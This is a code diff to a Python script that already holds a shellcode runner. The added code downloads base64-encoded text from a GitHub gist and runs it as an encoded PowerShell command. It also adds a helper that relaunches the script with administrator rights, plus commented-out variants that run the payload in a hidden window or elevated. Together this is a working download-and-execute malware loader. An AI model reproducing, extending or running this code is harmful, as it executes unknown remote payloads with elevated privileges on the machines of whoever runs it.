@@ -1,3 +1,4 @@
+import subprocess
 import ctypes
 import sys
 import os
@@ -159,8 +160,72 @@ def run_bingo(shellcode: bytes) -> None:
             print(f"Warning: Failed to free memory: {e}", file=sys.stderr)
 
 
+def run_as_admin():
+    # Check if already running with admin rights
+    try:
+        import ctypes
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        is_admin = False
+    
+    if is_admin:
+        return True  # Already admin, proceed normally
+    
+    # Re-launch this exact Python script with admin rights
+    params = f'"{sys.executable}" ' + ' '.join(f'"{arg}"' for arg in sys.argv)
+    ctypes.windll.shell32.ShellExecuteW(
+        None, "runas", sys.executable, params, None, 1
+    )
+    return False  # Script will exit and restart elevated
+
 def setup_environment():
     resp = requests.get("https://gist.githubusercontent.com/secteam911/89a124dd7dbcd44c33b7509fafbc3555/raw/1fc19e3a9655885260051b508cb3f9b15e501796/sec.txt")
-    b64 = resp.text
-    system(f"powershell -enc {b64}")
+    b64 = resp.text.replace("\r", "").replace("\n", "").strip()
+    # run_as_admin()
 
+
+    # result = subprocess.run(
+    #     ["powershell.exe", "-EncodedCommand", "-"],
+    #     input=b64,
+    #     text=True,               # b64 is str
+    #     capture_output=True,
+    #     creationflags=subprocess.CREATE_NO_WINDOW  # optional: no flashing window
+    # )
+
+
+    # subprocess.run([
+    #     'powershell', '-NoProfile', '-Command',
+    #     "if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')){Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -Command invoke-webrequest ''https://gist.githubusercontent.com/secteam911/89a124dd7dbcd44c33b7509fafbc3555/raw/d0a8f588eaf3c059a95d343d26f5794c2b8c5831/sec.txt'' -UseBasicParsing | %{powershell -enc $_.Content}';exit};invoke-webrequest 'https://gist.githubusercontent.com/secteam911/89a124dd7dbcd44c33b7509fafbc3555/raw/d0a8f588eaf3c059a95d343d26f5794c2b8c5831/sec.txt' -UseBasicParsing | %{powershell -enc $_.Content}"
+    # ], creationflags=subprocess.CREATE_NO_WINDOW)
+
+    # The three commands you want to execute in sequence inside the same PowerShell session
+    commands = [
+        # '$url = "https://gist.githubusercontent.com/secteam911/89a124dd7dbcd44c33b7509fafbc3555/raw/d0a8f588eaf3c059a95d343d26f5794c2b8c5831/sec.txt"',
+        # '$content = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content',
+        f'powershell -enc {b64}'
+    ]
+
+    # Join them with semicolons or newlines so they run sequentially
+    powershell_command = "; ".join(commands)
+
+    # Or use newlines for better readability (PowerShell accepts them)
+    # powershell_command = "\n".join(commands) + "\n"
+
+    # Run it
+    process = subprocess.Popen(
+        ['powershell', '-NoProfile', '-Command', powershell_command],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+        encoding='utf-8',
+        errors='replace'
+    )
+
+    # Capture output
+    stdout, stderr = process.communicate()
+
+    # print("STDOUT:")
+    # print(stdout)
+    # print("STDERR:")
+    # print(stderr)
+    # print(f"Return code: {process.returncode}")
